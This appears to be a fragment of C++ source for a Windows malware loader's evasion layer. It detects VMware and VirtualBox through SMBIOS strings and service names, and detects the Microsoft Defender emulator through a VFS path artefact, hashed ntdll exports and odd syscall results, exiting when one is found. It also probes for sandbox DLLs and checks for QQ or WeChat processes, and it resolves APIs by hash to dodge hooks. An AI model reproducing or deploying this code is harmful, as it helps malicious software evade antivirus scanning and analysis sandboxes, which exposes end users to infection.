    if (s == 0) return "Not Specified";
    while (s > 1 && *bp) {
        bp += strlen(bp) + 1;
        s--;
    }
    return *bp ? bp : "BAD_INDEX";
}
void dmi_system_uuid(const BYTE* p, short ver) {
    bool only0xFF = true, only0x00 = true;

    for (int i = 0; i < 16 && (only0x00 || only0xFF); i++) {
        if (p[i] != 0x00) only0x00 = false;
        if (p[i] != 0xFF) only0xFF = false;
    }

    if (only0xFF) {
        // std::cout << "Not Present" << std::endl;
        return;
    }
    if (only0x00) {
        // std::cout << "Not Settable" << std::endl;
        return;
    }

    if (ver >= 0x0206) {
        DebugPrintA("%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X\n",
            p[3], p[2], p[1], p[0], p[5], p[4], p[7], p[6],
            p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15]);
    }
    else {
        DebugPrintA("%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X\n",
            p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7],
            p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15]);
    }
}
RawSMBIOSData* get_smbios_data() {
    DWORD bufsize = 0;
    DWORD ret = GetSystemFirmwareTable('RSMB', 0, NULL, 0);

    if (ret == 0) {
        //  std::cerr << "Failed to get buffer size!" << std::endl;
        return nullptr;
    }

    bufsize = ret;
    BYTE* buffer = new BYTE[bufsize];

    if (GetSystemFirmwareTable('RSMB', 0, buffer, bufsize) == 0) {
        // std::cerr << "Failed to get SMBIOS data!" << std::endl;
        delete[] buffer;
        return nullptr;
    }

    return (RawSMBIOSData*)buffer;
}
void print_bios_info(const BYTE* p, const dmi_header* h) {
    std::cout << "\nType " << (int)h->type << " - [BIOS]" << std::endl;
    std::cout << "\tBIOS Vendor: " << dmi_string(h, p[0x4]) << std::endl;
    std::cout << "\tBIOS Version: " << dmi_string(h, p[0x5]) << std::endl;
    std::cout << "\tRelease Date: " << dmi_string(h, p[0x8]) << std::endl;

    if (p[0x16] != 0xFF && p[0x17] != 0xFF) {
        std::cout << "\tEC Version: " << (int)p[0x16] << "." << (int)p[0x17] << std::endl;
    }
}
void print_system_info(const BYTE* p, const dmi_header* h, const RawSMBIOSData* Smbios) {
    std::cout << "\nType " << (int)h->type << " - [System Information]" << std::endl;
    std::cout << "\tManufacturer: " << dmi_string(h, p[0x4]) << std::endl;
    std::cout << "\tProduct Name: " << dmi_string(h, p[0x5]) << std::endl;
    std::cout << "\tVersion: " << dmi_string(h, p[0x6]) << std::endl;
    std::cout << "\tSerial Number: " << dmi_string(h, p[0x7]) << std::endl;
    std::cout << "\tUUID: ";
    dmi_system_uuid(p + 0x8, Smbios->SMBIOSMajorVersion * 0x100 + Smbios->SMBIOSMinorVersion);
    std::cout << "\tSKU Number: " << dmi_string(h, p[0x19]) << std::endl;
    std::cout << "\tFamily: " << dmi_string(h, p[0x1a]) << std::endl;
}
void parse_smbios_data(const RawSMBIOSData* Smbios) {
    if (!Smbios) {
        std::cerr << "Invalid SMBIOS data!" << std::endl;
        return;
    }

    const BYTE* p = Smbios->SMBIOSTableData;
    BYTE* nonConstP = const_cast<BYTE*>(p);
    int flag = 1;

    while (p < Smbios->SMBIOSTableData + Smbios->Length) {
        dmi_header* h = (dmi_header*)p;

        if (h->type == 0 && flag) {
            print_bios_info(p, h);
            flag = 0;
        }
        else if (h->type == 1) {
            print_system_info(p, h, Smbios);
        }

        p += h->length;
        while (*(WORD*)p != 0) p++;
        p += 2;
    }
}
bool contains_vmware(const std::string& str) {
    std::string lowercase_str = str;
    std::transform(lowercase_str.begin(), lowercase_str.end(), lowercase_str.begin(), ::tolower);
    return lowercase_str.find("vmware") != std::string::npos;
}
BOOLEAN check_motherboard_vmware() {
    RawSMBIOSData* Smbios = get_smbios_data();
    if (!Smbios) {
        std::cerr << "Failed to retrieve SMBIOS data." << std::endl;
        return false;
    }

    const BYTE* p = Smbios->SMBIOSTableData;
    bool found_vmware = false;

    while (p < Smbios->SMBIOSTableData + Smbios->Length) {
        dmi_header* h = (dmi_header*)p;

        if (h->type == 1) { // Type 1 for System Information
            std::string manufacturer = dmi_string(h, p[0x4]);
            std::string serial_number = dmi_string(h, p[0x7]);

            // 检查 Manufacturer 和 Serial Number 是否包含 "VMWARE"
            if (contains_vmware(manufacturer) || contains_vmware(serial_number)) {
                found_vmware = true;
                break;
            }
        }

        p += h->length;
        while (*(WORD*)p != 0) p++;
        p += 2;
    }

    delete[](BYTE*)Smbios; // 清理分配的内存
    return found_vmware;
}

/*服务*/
BOOLEAN checkService() {
    // 打开系统服务控制管理器
    SC_HANDLE scManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scManager) return false;

    // 分配空间用于存储系统服务信息
    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
    std::vector<ENUM_SERVICE_STATUSA> serviceStatus(4096);

    // 获取系统服务的简单信息
    bool enumStatus = EnumServicesStatusA(
        scManager,                // 服务控制管理器句柄
        SERVICE_WIN32,            // 服务的类型
        SERVICE_STATE_ALL,        // 服务的状态
        serviceStatus.data(),     // 输出参数，接收服务信息的缓冲区
        serviceStatus.size() * sizeof(ENUM_SERVICE_STATUSA), // 缓冲区大小
        &bytesNeeded,             // 接收返回服务所需的缓冲区字节数
        &servicesReturned,        // 接收返回服务的数量
        &resumeHandle             // 返回值为0代表成功
    );

    if (!enumStatus) {
        CloseServiceHandle(scManager);
        return false;
    }

    // 服务名称关键字列表
    const std::vector<std::string> targetKeywords = {
        "VMware Tools", "VMware 物理磁盘助手服务", "Virtual Machine", "VirtualBox Guest"
    };

    // 检查服务是否包含指定关键字
    for (DWORD i = 0; i < servicesReturned; ++i) {
        std::string displayName(serviceStatus[i].lpDisplayName);
        for (const auto& keyword : targetKeywords) {
            if (displayName.find(keyword) != std::string::npos) {
                CloseServiceHandle(scManager);
                return true;
            }
        }
    }

    // 关闭服务管理器句柄
    CloseServiceHandle(scManager);
    return false;
}

#pragma warning(push)
#pragma warning(disable: 4055)
#pragma warning(disable: 4152)


/*defender*/


DWORD wdxEmulatorAPIHashTable[] = {
    0x70CE7692,
    0xD4CE4554,
    0x7A99CFAE
};

PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ DWORD ProcedureHash);


/*
* wdxGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD wdxGetHashForString(
    _In_ char* s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* wdxGetProcedureAddressByHash
*
* Purpose:
*
* Return pointer to function in MpClient from name hash value.
*
*/
PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID ImageBase,
    _In_ DWORD ProcedureHash
)
{
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER* DosHeader;
    IMAGE_EXPORT_DIRECTORY* Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Exports = dynamicInvoker.Invoke<PIMAGE_EXPORT_DIRECTORY>(RtlImageDirectoryEntryToDataStruct.funcAddr, RtlImageDirectoryEntryToDataStruct.funcHash,
        TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT,
        &sz);



    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (wdxGetHashForString((char*)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)ImageBase + FunctionPtr;
        }
    }

    return NULL;
}
/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(VOID)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri_w(szBuffer, szMsEngVFS) != NULL) {
        dynamicInvoker.Invoke<NTSTATUS>(RtlExitUserProcessStruct.funcAddr, RtlExitUserProcessStruct.funcHash, (UINT)0);
    }
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
NTSTATUS wdIsEmulatorPresent(
    VOID)
{
    PCHAR ImageBase = NULL;

    IMAGE_DOS_HEADER* DosHeader;
    IMAGE_EXPORT_DIRECTORY* Exports;
    PDWORD Names;

    ULONG i, c, Hash, sz = 0;
    UNICODE_STRING Nt = { 0 };
    dynamicInvoker.Invoke<NTSTATUS>(RtlInitUnicodeStringStruct.funcAddr, RtlInitUnicodeStringStruct.funcHash,
        &Nt, L"ntdll.dll");
    // UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");
#define LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT 0x00000001

    
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(LdrGetDllHandleExStruct.funcAddr, LdrGetDllHandleExStruct.funcHash,
        LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
        NULL, NULL, &Nt, &ImageBase);
    if (!NT_SUCCESS(status))
    {
        return STATUS_DLL_NOT_FOUND;
    }
    Exports = dynamicInvoker.Invoke<PIMAGE_EXPORT_DIRECTORY>(RtlImageDirectoryEntryToDataStruct.funcAddr, RtlImageDirectoryEntryToDataStruct.funcHash,
        ImageBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    // Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
    //     IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);
#define STATUS_INVALID_IMAGE_FORMAT 0xC000007B

    if (Exports == NULL)
        return STATUS_INVALID_IMAGE_FORMAT;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char*)((PBYTE)DosHeader + Names[i]));
        for (c = 0; c < RTL_NUMBER_OF(wdxEmulatorAPIHashTable); c++) {
            if (Hash == wdxEmulatorAPIHashTable[c])
                return 0xC0000001;
        }
    }
    return STATUS_NOT_SUPPORTED;
}

/*
* wdIsEmulatorPresent2
*
* Purpose:
*
* Detect MS emulator state 2.
*
* Microsoft AV defines virtual environment dlls loaded in runtime from VDM files.
* These fake libraries implement additional detection layer and come with a lot of
* predefined values.
*
*/
BOOLEAN wdIsEmulatorPresent2(VOID){
    
    return dynamicInvoker.Invoke<NTSTATUS>(NtIsProcessInJobStruct.funcAddr, NtIsProcessInJobStruct.funcHash,
        (HANDLE)-1, UlongToHandle(10)) == 0x125;
}

/*
* wdIsEmulatorPresent3
*
* Purpose:
*
* Same as previous.
*
*/
BOOLEAN wdIsEmulatorPresent3(VOID){
    
    if (NT_SUCCESS(dynamicInvoker.Invoke<NTSTATUS>(NtCompressKeyStruct.funcAddr, NtCompressKeyStruct.funcHash, UlongToHandle(0xFFFF1234))))
        return TRUE;

    return FALSE;
}

#pragma warning(pop)

BOOLEAN checkDllGetClassObject() {
    pDllGetClassObject DllGetClassObject = (pDllGetClassObject)GetProcAddressbyHASH(myLoadLibrary(L"pid.dll"), DllGetClassObject_Hashed);
    GUID sid = { 0 };
    GUID iid = { 0 };
    LPVOID lpmem = NULL;
    HRESULT hr = DllGetClassObject(sid, iid, &lpmem);
    
    return(hr != CLASS_E_CLASSNOTAVAILABLE);
}
BOOLEAN checkSxInDll() {
    if (myLoadLibrary(L"SxIn.dll")) return TRUE;
    return FALSE;
}
BOOLEAN checkProcessVX_QQ() {
    ULONG retLen = 0;

    
    PSYSTEM_PROCESS_INFORMATION pspi = (PSYSTEM_PROCESS_INFORMATION)malloc(0x100000);
    memset(pspi, 0, 0x100000);

    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemProcessInformation, pspi, 0x100000, &retLen);

    int num = retLen / pspi->NextEntryOffset;
    for (int i = 0; i < num; i++) {
		if (pspi->ImageName.Buffer != NULL) {
			if (wcsstr(pspi->ImageName.Buffer, L"QQ") != NULL || wcsstr(pspi->ImageName.Buffer, L"WeChat") != NULL) {
				return TRUE;

                DebugPrintW(L"Detect %s!", pspi->ImageName.Buffer);
			}
		}
		pspi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pspi + pspi->NextEntryOffset);
	}

    return FALSE;
}